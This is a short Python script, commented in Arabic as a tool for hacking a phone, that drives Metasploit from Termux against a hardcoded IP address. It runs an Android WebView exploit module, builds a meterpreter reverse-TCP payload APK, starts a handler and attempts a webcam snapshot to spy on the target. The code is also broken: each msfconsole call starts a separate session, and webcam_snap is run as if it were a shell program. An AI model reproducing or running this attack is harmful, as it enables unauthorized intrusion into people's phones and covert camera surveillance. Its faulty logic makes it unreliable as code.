import subprocess

def exploit_termux(ip):
    try:
        # استخدام Metasploit لاختراق الهاتف
        subprocess.run(["termux-setup-storage"])
        input("Press Enter to continue...")
        subprocess.run(["pkg", "update", "-y"])
        input("Press Enter to continue...")
        subprocess.run(["pkg", "upgrade", "-y"])
        input("Press Enter to continue...")
        subprocess.run(["pkg", "install", "metasploit", "-y"])
        input("Press Enter to continue...")
        subprocess.run(["msfconsole", "-q", "-x", f'use exploit/android/browser/webview_addjavascriptinterface'])
        input("Press Enter to continue...")
        subprocess.run(["msfconsole", "-q", "-x", f'set RHOSTS {ip}'])
        input("Press Enter to continue...")
        subprocess.run(["msfconsole", "-q", "-x", 'exploit'])
        input("Press Enter to continue...")
        # أوامر لفتح الكاميرا والمايك والتقاط صورة
        subprocess.run(["msfvenom", "-p", "android/meterpreter/reverse_tcp", "LHOST=your_ip", "LPORT=your_port", "-o", "payload.apk"])
        input("Press Enter to continue...")
        subprocess.run(["msfconsole", "-q", "-x", f'use multi/handler'])
        input("Press Enter to continue...")
        subprocess.run(["msfconsole", "-q", "-x", f'set payload android/meterpreter/reverse_tcp'])
        input("Press Enter to continue...")
        subprocess.run(["msfconsole", "-q", "-x", f'set LHOST your_ip'])
        input("Press Enter to continue...")
        subprocess.run(["msfconsole", "-q", "-x", f'set LPORT your_port'])
        input("Press Enter to continue...")
        subprocess.run(["msfconsole", "-q", "-x", 'exploit'])
        input("Press Enter to continue...")
        subprocess.run(["webcam_snap", "-o", "photo.jpg"])
        input("Press Enter to continue...")
    except Exception as e:
        print(f"Error: {e}")

# استخدام الدالة لاختراق الهاتف بواسطة عنوان IP
exploit_termux("192.168.1.107")
